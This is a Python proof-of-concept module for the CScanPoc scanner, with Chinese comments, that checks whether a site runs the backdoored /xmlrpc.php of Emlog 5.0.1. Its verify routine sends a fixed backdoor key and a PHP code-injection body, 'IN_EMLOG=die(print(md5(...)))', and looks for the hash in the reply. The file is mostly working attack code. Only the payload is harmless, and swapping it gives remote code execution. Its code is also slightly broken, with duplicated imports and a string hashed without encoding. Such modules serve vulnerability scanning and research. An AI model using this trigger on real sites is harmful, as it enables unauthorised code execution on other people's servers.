# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import random
import hashlib


class Vuln(ABVuln):
    vuln_id = 'Emlog_0007'  # 平台漏洞编号，留空
    name = 'Emlog 5.0.1 /xmlrpc.php 后门漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2013-05-06'  # 漏洞公布时间
    desc = '''
        Emlog 5.0.1 /xmlrpc.php 后门漏洞
    '''  # 漏洞描述
    ref = 'https://www.tuicool.com/articles/vIJJVr'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Emlog'  # 漏洞应用名称
    product_version = '5.0.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f116e3fc-5fbe-4fe6-8e97-379c109b0125'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            random_str = str(random.random())
            random_md5 = hashlib.md5(random_str).hexdigest()
            payload = '/xmlrpc.php?rsdsrv=20c6868249a44b0ab92146eac6211aeefcf68eec'
            verify_url = '{target}'.format(target=self.target)+payload

            request = urllib.request.Request(
                verify_url, "IN_EMLOG=die(print(md5("+random_str+")));")
            content = str(urllib.request.urlopen(request).read())

            if random_md5 in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
